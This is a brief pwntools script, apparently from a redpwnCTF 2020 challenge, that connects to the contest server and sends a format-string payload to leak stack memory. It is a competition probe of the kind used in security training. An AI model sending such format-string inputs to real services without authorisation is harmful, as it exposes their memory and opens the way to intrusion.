from pwn import *

#context.update(log_level='debug')


p = remote('2020.redpwnc.tf', 31744)

p.recvrepeat(1)

p.sendline('%lx|'*2)


p.interactive()
